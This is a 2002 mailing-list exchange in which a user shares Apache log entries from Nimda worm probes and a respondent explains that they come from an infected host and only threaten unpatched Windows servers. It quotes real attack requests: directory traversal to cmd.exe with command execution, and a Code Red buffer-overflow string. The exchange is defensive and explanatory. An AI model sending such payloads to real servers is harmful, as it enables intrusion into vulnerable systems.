From: Chuck Gelm <nc8q@gelm.net>
Subject: Re: Blocking hackers
Date: Fri, 21 Jun 2002 16:50:26 -0400
Sender: linux-newbie-owner@vger.kernel.org
Message-ID: <3D139192.C63E245C@gelm.net>
References: <004701c218d7$cf274dd0$0c00a8c0@qpbd103>
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <linux-newbie-owner@vger.kernel.org>
List-Id: <linux-newbie.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: Phillp Morgan <pmorgan@quickpages.net.au>, linux-newbie@vger.kernel.org

I get the same thing, Phillp.

It is not a hacker, it is a trojan infected user.
The host owner probably has no idea that his system
is trying to infect your web server with Nimda.

 If you are not running an unpatched version of a
Windows server, you are not vulnerable to this attack.
It consumes very very little bandwidth. ;-)

I use apache. ;-)

 Also watch for 'Code Red'.  Those log file lines
will have a bunch of upper case "N's in them.
ala:
211.218.111.96 - - [08/May/2002:03:15:03 -0400] "GET
/default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a 
HTTP/1.0" 400 316

Again, if your are not running an unpatched Windows server...
 
HTH, Chuck

Phillp Morgan wrote:
> 
> Hi,
> 
> It looks like someone is trying to break into my system. This is out of my
> apache error log...
> 
> >61.243.140.78 - - [21/Jun/2002:13:58:29 +1000] "GET /MSADC/root.exe?/c+dir
> HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:30 +1000] "GET
> /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:31 +1000] "GET
> /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:32 +1000] "GET
> /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:33 +1000] "GET
> /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+di
> r HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:34 +1000] "GET
> /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+di
> r HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:36 +1000] "GET
> /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../
> winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:29 +1000] "GET /MSADC/root.exe?/c+dir
> HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:30 +1000] "GET
> /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:31 +1000] "GET
> /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:32 +1000] "GET
> /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 -
> >61.243.140.78 - - [21/Jun/2002:13:58:33 +1000] "GET
> /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
> HTTP/1.0" 404 -
> 
> Is there any way I can block this nasty person?
> 
> Who should I report this to?
> 
> Regards,
> 
> Phillip Morgan
> Chief Information Offier
> Quickpages Business Directories
> ----------------------------------------------------------------------------
> ------------
> This email is intended for the above named recipient only, and may contain
> priveledged information. If you are not the intended recipient please delete
> this email immediately and notify Quickpages of the problem.
> 
> -
> To unsubscribe from this list: send the line "unsubscribe linux-newbie" in
> the body of a message to majordomo@vger.kernel.org
> More majordomo info at  http://vger.kernel.org/majordomo-info.html
> Please read the FAQ at http://www.linux-learn.org/faqs
-
To unsubscribe from this list: send the line "unsubscribe linux-newbie" in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
Please read the FAQ at http://www.linux-learn.org/faqs
